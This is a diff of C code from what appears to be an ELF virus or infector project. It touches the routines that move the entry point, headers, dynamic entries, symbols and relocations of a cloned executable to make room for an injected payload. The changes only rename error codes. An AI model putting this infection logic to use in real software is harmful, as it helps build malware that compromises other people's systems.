@@ -24,7 +24,7 @@ static bool	adjust_header_values(struct safe_ptr clone_ref, size_t payload_offse
 	Elf64_Ehdr	*elf_hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));
 
 	if (elf_hdr == NULL)
-		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
+		return errors(ERR_FILE, _ERR_F_READ_EHDR, _ERR_T_ADJUST_HEADER_VALUES);
 
 	elf_hdr->e_entry += shift_amount;
 
@@ -44,7 +44,7 @@ static bool	adjust_phdr_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Phdr	*phdr = safe(ref, offset, sizeof(Elf64_Phdr));
 
 	if (phdr == NULL)
-		return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);
+		return errors(ERR_FILE, _ERR_F_READ_PHDR, _ERR_T_ADJUST_PHDR_VALUES);
 
 	Elf64_Off	p_offset = phdr->p_offset;
 	Elf64_Addr	p_vaddr  = phdr->p_vaddr;
@@ -76,7 +76,7 @@ static bool	adjust_dynamic_values(struct safe_ptr ref, size_t offset, void *data
 	Elf64_Dyn	*dynamic = safe(ref, offset, sizeof(Elf64_Dyn));
 
 	if (dynamic == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_DYNAMIC);
+		return errors(ERR_FILE, _ERR_F_READ_DYNAMIC, _ERR_T_ADJUST_DYNAMIC_VALUES);
 
 	Elf64_Sxword	d_tag = dynamic->d_tag;
 	Elf64_Addr	d_ptr = dynamic->d_un.d_ptr;
@@ -117,7 +117,7 @@ static bool	adjust_dynsym_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Sym	*dynsym = safe(ref, offset, sizeof(Elf64_Sym));
 
 	if (dynsym == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_DYNAMIC_SYM);
+		return errors(ERR_FILE, _ERR_F_READ_DYNSYM, _ERR_T_ADJUST_DYNSYM_VALUES);
 
 	Elf64_Addr	st_value = dynsym->st_value;
 
@@ -137,7 +137,7 @@ static bool	adjust_rel_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Rela	*rel = safe(ref, offset, sizeof(Elf64_Rel));
 
 	if (rel == NULL)
-		return errors(ERRO_VIRUS, _ERR_V_CANT_READ_RELOCATION);
+		return errors(ERR_FILE, _ERR_F_READ_REL, _ERR_T_ADJUST_REL_VALUES);
 
 	struct data	*closure = data;
 	size_t		payload_addr = closure->payload_addr;
@@ -157,7 +157,7 @@ static bool	adjust_rela_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Rela	*rela = safe(ref, offset, sizeof(Elf64_Rela));
 
 	if (rela == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_RELA);
+		return errors(ERR_FILE, _ERR_F_READ_RELA, _ERR_T_ADJUST_RELA_VALUES);
 
 	struct data	*closure = data;
 	size_t		payload_addr = closure->payload_addr;
@@ -185,7 +185,7 @@ static bool	adjust_shdr_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Shdr	*shdr = safe(ref, offset, sizeof(Elf64_Shdr));
 
 	if (shdr == NULL)
-		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);
+		return errors(ERR_FILE, _ERR_F_READ_SHDR, _ERR_T_ADJUST_SHDR_VALUES);
 
 	Elf64_Off	sh_offset = shdr->sh_offset;
 	Elf64_Addr	sh_addr   = shdr->sh_addr;
@@ -230,7 +230,7 @@ static bool	adjust_shdr_values(struct safe_ptr ref, size_t offset, void *data)
 	}
 	return true;
 error:
-	return errors(ERR_THROW, _ERR_T_ADJUST_SHDR_VALUES);
+	return errors(ERR_THROW, _ERR_NO, _ERR_T_ADJUST_SHDR_VALUES);
 }
 
 bool		adjust_references(struct safe_ptr clone_ref,
@@ -240,7 +240,7 @@ bool		adjust_references(struct safe_ptr clone_ref,
 	const size_t	payload_addr = clone_entry.payload_addr;
 
 	if (!adjust_header_values(clone_ref, payload_offset, shift_amount))
-		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_ADJUST_REFERENCES);
 
 	struct data	closure;
 
@@ -250,12 +250,12 @@ bool		adjust_references(struct safe_ptr clone_ref,
 	closure.is_pie         = false;
 
 	if (!foreach_phdr(clone_ref, adjust_phdr_values, &closure))
-		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_ADJUST_REFERENCES);
 	if (!foreach_shdr(clone_ref, adjust_shdr_values, &closure))
-		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_ADJUST_REFERENCES);
 
 	if (closure.is_pie == false)
-		return errors(ERR_VIRUS, _ERR_V_IS_NOT_PIE);
+		return errors(ERR_FILE, _ERR_F_NOT_PIE, _ERR_T_ADJUST_REFERENCES);
 
 	return true;
 }
